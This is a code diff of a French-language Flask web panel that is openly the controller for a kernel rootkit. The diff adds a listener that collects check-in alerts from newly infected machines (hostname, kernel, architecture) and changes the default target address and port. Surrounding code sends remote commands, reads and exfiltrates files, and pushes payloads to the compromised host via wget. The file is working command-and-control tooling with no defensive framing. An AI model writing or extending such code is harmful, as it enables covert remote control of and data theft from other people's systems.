@@ -8,6 +8,61 @@ import tempfile
 import re
 import hashlib
 from werkzeug.utils import secure_filename
+import threading
+import time
+from datetime import datetime
+import json
+
+notifications = []
+notifications_lock = threading.Lock()
+
+def serveur_notifications():
+    try:
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        server_socket.bind(('0.0.0.0', 9999))
+        server_socket.listen(5)
+        
+        print(f"[NOTIFICATIONS] Serveur d'alertes démarré sur le port 9999")
+        
+        while True:
+            try:
+                client_socket, addr = server_socket.accept()
+                data = client_socket.recv(2048).decode()
+                client_socket.close()
+                
+                if data.startswith("ROOTKIT_ALERT"):
+                    notification = {
+                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                        'source_ip': addr[0],
+                        'message': data,
+                        'type': 'INSTALLATION'
+                    }
+                    
+                    lines = data.split('\n')
+                    for line in lines:
+                        if 'Hostname:' in line:
+                            notification['hostname'] = line.split(':', 1)[1].strip()
+                        elif 'Kernel:' in line:
+                            notification['kernel'] = line.split(':', 1)[1].strip()
+                        elif 'Architecture:' in line:
+                            notification['architecture'] = line.split(':', 1)[1].strip()
+                    
+                    with notifications_lock:
+                        notifications.append(notification)
+                        if len(notifications) > 50:
+                            notifications.pop(0)
+                    
+                    print(f"[ALERT] Nouveau rootkit installé sur {notification.get('hostname', 'UNKNOWN')} ({addr[0]})")
+                
+            except Exception as e:
+                print(f"[NOTIFICATIONS] Erreur: {e}")
+                
+    except Exception as e:
+        print(f"[NOTIFICATIONS] Erreur serveur: {e}")
+
+notification_thread = threading.Thread(target=serveur_notifications, daemon=True)
+notification_thread.start()
 
 app = Flask(__name__)
 app.secret_key = 'clef_secrete_rootkit_2024'
@@ -94,8 +149,8 @@ def auth_page():
             <div class="step">Étape 1: Configuration de la connexion</div>
             
             <form id="auth-form">
-                <input type="text" id="target-ip" class="auth-input" placeholder="Adresse IP cible" value="10.0.2.6" required>
-                <input type="text" id="target-port" class="auth-input" placeholder="Port" value="8007" required>
+                <input type="text" id="target-ip" class="auth-input" placeholder="Adresse IP cible" value="192.168.56.5" required>
+                <input type="text" id="target-port" class="auth-input" placeholder="Port" value="7012" required>
                 <input type="password" id="password" class="auth-input" placeholder="Mot de passe rootkit" required>
                 <button type="submit" class="auth-button">CONNECTER ET AUTHENTIFIER</button>
             </form>
@@ -368,6 +423,29 @@ def main_interface():
                 width: 100%;
                 font-family: 'Courier New', monospace;
             }
+            .notifications-panel {
+                background-color: #111;
+                border: 2px solid #f00;
+                padding: 10px;
+                margin-bottom: 10px;
+                max-height: 150px;
+            }
+            
+            .notification-item {
+                border-bottom: 1px solid #333;
+                padding: 5px 0;
+                color: #ff0;
+            }
+            
+            .notification-new {
+                background-color: #220000;
+                animation: blink 2s infinite;
+            }
+            
+            @keyframes blink {
+                0%, 50% { background-color: #220000; }
+                51%, 100% { background-color: #111; }
+            }
         </style>
     </head>
     <body>
@@ -377,6 +455,14 @@ def main_interface():
         </div>
         
         <div class="terminal-body">
+            <div class="notifications-panel">
+                <div style="color: #f00; font-weight: bold; margin-bottom: 5px;">
+                    🚨 ALERTES ROOTKIT (<span id="notification-count">0</span>)
+                </div>
+                <div id="notifications-list" style="max-height: 100px; overflow-y: auto; background-color: #111; border: 1px solid #f00; padding: 5px;">
+                    <div style="color: #555;">En attente d'alertes...</div>
+                </div>
+            </div>
             <div class="tab-bar">
                 <div class="tab active" onclick="changerMode('commande')">Mode Commande</div>
                 <div class="tab" onclick="changerMode('fichier')">Mode Fichier</div>
@@ -398,8 +484,8 @@ def main_interface():
             </div>
             
             <div class="config-panel">
-                <input type="text" id="ip" placeholder="Adresse IP" value="10.0.2.6">
-                <input type="text" id="port" placeholder="Port" value="8007">
+                <input type="text" id="ip" placeholder="Adresse IP" value="192.168.56.5">
+                <input type="text" id="port" placeholder="Port" value="7012">
                 <button onclick="testFunction()">Connecter</button>
             </div>
             
@@ -446,42 +532,77 @@ def main_interface():
         <script>
             let modeActuel = 'commande';
             let connecte = false;
-            let port8007Status = false;
+            let port7012Status = false;
+            let lastNotificationCheck = 0;
+
+            function actualiserNotifications() {
+                fetch('/api/get_notifications')
+                .then(response => response.json())
+                .then(data => {
+                    const notificationsList = document.getElementById('notifications-list');
+                    const notificationCount = document.getElementById('notification-count');
+                    
+                    if (data.notifications && data.notifications.length > 0) {
+                        notificationCount.textContent = data.notifications.length;
+                        
+                        let html = '';
+                        data.notifications.slice(-3).reverse().forEach((notif, index) => {
+                            const isNew = index < (data.notifications.length - lastNotificationCheck);
+                            html += `<div class="notification-item ${isNew ? 'notification-new' : ''}">
+                                <strong>[${notif.timestamp}]</strong> 
+                                ${notif.hostname || 'UNKNOWN'} (${notif.source_ip})
+                            </div>`;
+                        });
+                        
+                        notificationsList.innerHTML = html;
+                        lastNotificationCheck = data.notifications.length;
+                    } else {
+                        notificationCount.textContent = '0';
+                        notificationsList.innerHTML = '<div style="color: #555;">Aucune alerte reçue</div>';
+                    }
+                })
+                .catch(error => {
+                    console.error('Erreur récupération notifications:', error);
+                });
+            }
+            
+            setInterval(actualiserNotifications, 3000);
+            setTimeout(actualiserNotifications, 1000);
             
             function updateClock() {
                 const now = new Date();
                 let timeText = now.toLocaleTimeString();
                 
-                if (port8007Status) {
-                    timeText += " | Port 8007: <span style='color: #0f0;'>OUVERT</span>";
+                if (port7012Status) {
+                    timeText += " | Port 7012: <span style='color: #0f0;'>OUVERT</span>";
                 } else {
-                    timeText += " | Port 8007: <span style='color: #f00;'>FERMÉ</span>";
+                    timeText += " | Port 7012: <span style='color: #f00;'>FERMÉ</span>";
                 }
                 
                 document.getElementById('time').innerHTML = timeText;
             }
             
-            function verifierPort8007() {
+            function verifierPort7012() {
                 const ip = document.getElementById('ip').value;
                 
                 fetch('/api/verifier_port', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ip: ip, port: 8007})
+                    body: JSON.stringify({ip: ip, port: 7012})
                 })
                 .then(response => response.json())
                 .then(data => {
-                    port8007Status = data.ouvert;
+                    port7012Status = data.ouvert;
                     updateClock();
                 })
                 .catch(error => {
-                    port8007Status = false;
+                    port7012Status = false;
                     updateClock();
                 });
             }
             
-            setInterval(verifierPort8007, 5000);
-            setTimeout(verifierPort8007, 1000);
+            setInterval(verifierPort7012, 5000);
+            setTimeout(verifierPort7012, 1000);
             setInterval(updateClock, 1000);
             updateClock();
             
@@ -668,7 +789,7 @@ def main_interface():
                             afficherResultat(`Upload via WGET: ${file.name}\\nDestination: ${targetPath}\\n\\nEtape 1/2: Fichier stocké sur serveur\\nURL: ${data.download_url}\\n\\nEtape 2/2: Téléchargement via wget...`);
                             
                             const ip = document.getElementById('ip').value;
-                            const port = document.getElementById('port').value || '8007';
+                            const port = document.getElementById('port').value || '7012';
                             
                             fetch('/api/wget_download', {
                                 method: 'POST',
@@ -709,7 +830,7 @@ def main_interface():
                 if (!filePath) return;
                 
                 const ip = document.getElementById('ip').value;
-                const port = document.getElementById('port').value || '8007';
+                const port = document.getElementById('port').value || '7012';
                 
                 afficherResultat(`Download: ${filePath}\\nVérification et téléchargement...`);
                 
@@ -744,7 +865,7 @@ def main_interface():
             
             function testFichiers() {
                 const ip = document.getElementById('ip').value;
-                const port = document.getElementById('port').value || '8007';
+                const port = document.getElementById('port').value || '7012';
                 
                 fetch('/api/commande_rootkit', {
                     method: 'POST',
@@ -774,7 +895,7 @@ def main_interface():
 def verifier_port():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 8007))
+    port = int(data.get('port', 7012))
     
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -793,7 +914,7 @@ def verifier_port():
 def authenticate():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 8007))
+    port = int(data.get('port', 7012))
     password = data.get('password')
     
     # Tester l'authentification directement avec le kernel
@@ -838,11 +959,16 @@ def logout():
     session.clear()
     return redirect('/')
 
+@app.route('/api/get_notifications')
+def get_notifications():
+    with notifications_lock:
+        return jsonify({"notifications": notifications.copy()})
+
 @app.route('/api/executer', methods=['POST'])
 def executer():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 8007))
+    port = int(data.get('port', 7012))
     commande = data.get('commande')
     
     resultat = envoyer_commande(ip, port, "EXEC " + commande)
@@ -852,7 +978,7 @@ def executer():
 def lire():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 8007))
+    port = int(data.get('port', 7012))
     chemin = data.get('chemin')
     
     resultat = envoyer_commande(ip, port, "LIRE " + chemin)
@@ -902,7 +1028,7 @@ def download_file_serve(filename):
 def download_file_from_target():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 8007))
+    port = int(data.get('port', 7012))
     file_path = data.get('file_path')
     
     if not file_path:
@@ -983,7 +1109,7 @@ def download_file_from_target():
 def wget_download():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 8007))
+    port = int(data.get('port', 7012))
     download_url = data.get('download_url')
     target_path = data.get('target_path', '/tmp/')
     method = data.get('method', 'wget')
@@ -1008,7 +1134,7 @@ def wget_download():
 def commande_rootkit():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 8007))
+    port = int(data.get('port', 7012))
     commande = data.get('commande')
     
     try:
